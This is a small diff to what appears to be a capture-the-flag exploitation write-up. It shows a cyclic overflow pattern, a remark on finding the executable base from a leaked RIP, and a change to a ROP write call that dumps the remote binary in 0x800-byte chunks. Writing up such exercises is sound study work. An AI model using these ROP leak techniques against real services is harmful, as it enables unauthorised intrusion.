@@ -261,7 +261,7 @@ aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa\x00Y\x1
 At one point I deduced the start of the executable address space from the leaked RIP, and downloaded the binary piece by piece in 0x800 byte chunks
 
 ```python
-rop.write(4,exe_base, 0x100)
+rop.write(4,exe_base, 0x800)
 ```
 Elf header:
 ```
